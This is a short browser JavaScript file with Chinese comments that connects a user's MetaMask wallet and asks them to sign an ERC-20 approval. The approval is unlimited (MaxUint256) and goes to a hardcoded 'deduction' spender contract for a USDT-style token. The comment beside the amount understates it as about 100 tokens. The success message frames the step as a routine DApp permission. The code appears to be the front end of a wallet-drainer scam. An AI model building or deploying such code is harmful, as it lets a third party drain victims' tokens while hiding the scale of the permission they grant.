let provider;
let signer;
let userAddress;

const connectBtn = document.getElementById('connectBtn');
const approveBtn = document.getElementById('approveBtn');
const statusText = document.getElementById('statusText');

// ERC-20 代幣的 Approve 函數 ABI
const erc20Abi = [
    "function approve(address spender, uint256 amount) public returns (bool)"
];

// 1. 連結錢包功能
connectBtn.addEventListener('click', async () => {
    if (typeof window.ethereum !== 'undefined') {
        try {
            // 請求使用者授權連結錢包
            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();
            userAddress = await signer.getAddress();
            
            // 更新 UI
            statusText.innerText = `已連結錢包：${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
            connectBtn.style.display = 'none';
            approveBtn.style.display = 'block';
        } catch (error) {
            console.error(error);
            statusText.innerText = "連線失敗：" + error.message;
        }
    } else {
        statusText.innerText = "請先安裝 MetaMask 錢包！";
    }
});

// 2. 授權合約功能 (Approve)
approveBtn.addEventListener('click', async () => {
    // 替換成你想操作的代幣合約地址（例如 USDT）以及扣款合約地址（Spender）
    const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";// 代幣合約
    const spenderAddress = "0x5eFE7009C1F349475E45ff200fcA01D00e6694FC";// 授權對象合約
    const amount = ethers.MaxUint256; // 授權數量 (例如 100 顆，需注意代幣小數位數)

    try {
        statusText.innerText = "請在錢包中確認授權交易...";
        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
        
        // 發送交易
        const tx = await tokenContract.approve(spenderAddress, amount);
        statusText.innerText = `交易已送出，等待區塊鏈確認... Hash: ${tx.hash}`;
        
        // 等待交易打包
        await tx.wait();
        statusText.innerText = "🎉 授權成功！您現在可以繼續使用 DApp 功能。";
    } catch (error) {
        console.error(error);
        statusText.innerText = "授權失敗：" + error.message;
    }
});
